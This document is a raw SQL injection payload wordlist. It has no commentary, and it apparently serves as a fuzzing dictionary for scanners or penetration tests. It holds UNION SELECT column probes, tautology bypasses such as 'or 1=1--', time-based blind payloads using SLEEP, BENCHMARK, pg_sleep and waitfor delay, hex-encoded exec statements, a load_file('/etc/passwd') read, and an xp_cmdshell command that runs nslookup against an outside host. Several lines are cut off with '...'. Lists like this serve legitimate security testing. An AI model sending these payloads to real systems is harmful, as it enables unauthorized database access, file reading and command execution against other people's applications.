UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--
UNION ALL SELECT 1,2,3,4,5,6,7,8,9--
UNION ALL SELECT 1,2,3,4,5,6,7,8--
UNION ALL SELECT 1,2,3,4,5,6,7--
UNION ALL SELECT 1,2,3,4,5,6--
UNION ALL SELECT 1,2,3,4,5--
UNION ALL SELECT 1,2,3,4--
UNION ALL SELECT 1,2,3--
UNION ALL SELECT 1,2--
UNION ALL SELECT 1--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--
UNION ALL SELECT @@VERSION,USER(),SLEEP(5)--
UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--
UNION ALL SELECT NULL
UNION ALL SELECT NULL#
UNION ALL SELECT NULL--
UNION ALL SELECT SLEEP(5)--
UNION ALL SELECT USER(),SLEEP(5)--
UNION ALL SELECT USER()--
UNION SELECT
UNION SELECT @@VERSION,SLEEP(5),"'3
UNION SELECT @@VERSION,SLEEP(5),"'3'"#
UNION SELECT @@VERSION,SLEEP(5),3
UNION SELECT @@VERSION,SLEEP(5),USER(),4
UNION SELECT @@VERSION,SLEEP(5),USER(),4#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
WHERE 1=1 AND 1=0
WHERE 1=1 AND 1=0#
WHERE 1=1 AND 1=0--
WHERE 1=1 AND 1=1
WHERE 1=1 AND 1=1#
WHERE 1=1 AND 1=1--
\
\\
\x27UNION SELECT
`
`	    Backtick
``
a" or 1=1--
a"""" or 3=3--"""
a'
a' or 'a' = 'a
a' or 1=1--
a' or 3=3--
a' waitfor delay '0:0:10'--
admin' or '
and (select substring(@@version,1,1))='M'
and (select substring(@@version,1,1))='X'
and (select substring(@@version,2,1))='i'
and (select substring(@@version,2,1))='y'
and (select substring(@@version,3,1))='S'
and (select substring(@@version,3,1))='X'
and (select substring(@@version,3,1))='c'
and 0=benchmark(3000000,MD5(1))%20%23
and 0=benchmark(3000000,MD5(1))%20--
and 0=benchmark(3000000,MD5(1))%20/*
and 1 in (select var from temp)--
and 1=( if((load_file(char(110,46,101,120,11 ...
anything' OR 'x'='x
as
asc
benchmark(10000000,MD5(1))#
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))#
benchmark(50000000,MD5(1))--
bfilename
char%4039%41%2b%40SELECT
declare @q nvarchar (200) 0x730065006c00650063 ...
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
declare @q nvarchar (200) select @q = 0x770061 ...
declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
declare @q nvarchar (4000) select @q =
declare @s varchar (200) select @s = 0x73656c6 ...
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
declare @s varchar (8000) select @s = 0x73656c ...
declare @s varchar(200) select @s = 0x77616974 ...
declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)
declare @s varchar(22) select @s =
delete
desc
distinct
exec sp
exec xp
exec(@s)
group by userid having 1=1--
handler
having
having 1=1--
hi or 1=1 --"
hi or a=a
hi"""") or (""""a""""=""""a"""
hi' or 'a'='a
hi' or 'x'='x';
hi' or 1=1 --
hi') or ('a'='a
insert
like
limit
or
or ""a""=""a"
or ''='
or '1'='1
or '1'='1'--
or '7659'='7659
or 'a'='a
or 'something' = 'some'+'thing'
or 'text' = n'text'
or 'text' > 't'
or 'unusual' = 'unusual'
or 'whatever' in ('whatever')
or (EXISTS)
or 0=0 #
or 0=0 #"
or 0=0 --
or 1 --'
or 1 in (select @@version)--
or 1/*
or 1=1
or 1=1 /*
or 1=1 or ""=
or 1=1 or ''='
or 1=1--
or 1=1--"
or 2 > 1
or 2 between 1 and 3
or 3=3
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)='
or a = a
or a=a
or a=a--
or benchmark(10000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))--
or isNULL(1/0) /*
or pg_SLEEP(5)
or pg_SLEEP(5)#
or pg_SLEEP(5)--
or pg_sleep(__TIME__)--
or pg_sleep(__TIME__)--"
or sleep(__TIME__)#
or sleep(__TIME__)='
or username like char(37);
or%201=1
or%201=1 --
order by
password:*/=1--
pg_SLEEP(5)
pg_SLEEP(5)#
pg_SLEEP(5)--
pg_sleep(5)--
pg_sleep(__TIME__)--
procedure
replace
select
select * from information_schema.tables--
select name from syscolumns where id = (sele ...
sleep(5)#
sleep(__TIME__)#
sqlvuln
sqlvuln;
t'exec master..xp_cmdshell 'nslookup www.googl ...
t'exec master..xp_cmdshell 'nslookup www.google.com'--
to_timestamp_tz
truncate
tz_offset
uni/**/on sel/**/ect
union all select @@version--
union select
union select * from users where login = char ...
union select 1,load_file('/etc/passwd'),1,1,1;
update
waitfor delay '00:00:05'
waitfor delay '00:00:05'#
waitfor delay '00:00:05'--
waitfor delay '0:0:20' --
waitfor delay '0:0:20' /*
x' AND 1=(SELECT COUNT(*) FROM tabname); --
x' AND email IS NULL; --
x' AND members.email IS NULL; --
x' AND userid IS NULL; --
x' OR full_name LIKE '%Bob%
x' or 1=1 or 'x'='y
|
||		(double pipe) concatenate
||'6
||(elt(-3+5,bin(15),ord(10),hex(char(45))))
||6
||UTL_HTTP.REQUEST
Ã½ or 1=1 --
â or 1=1 --
â or 3=3 --
```


















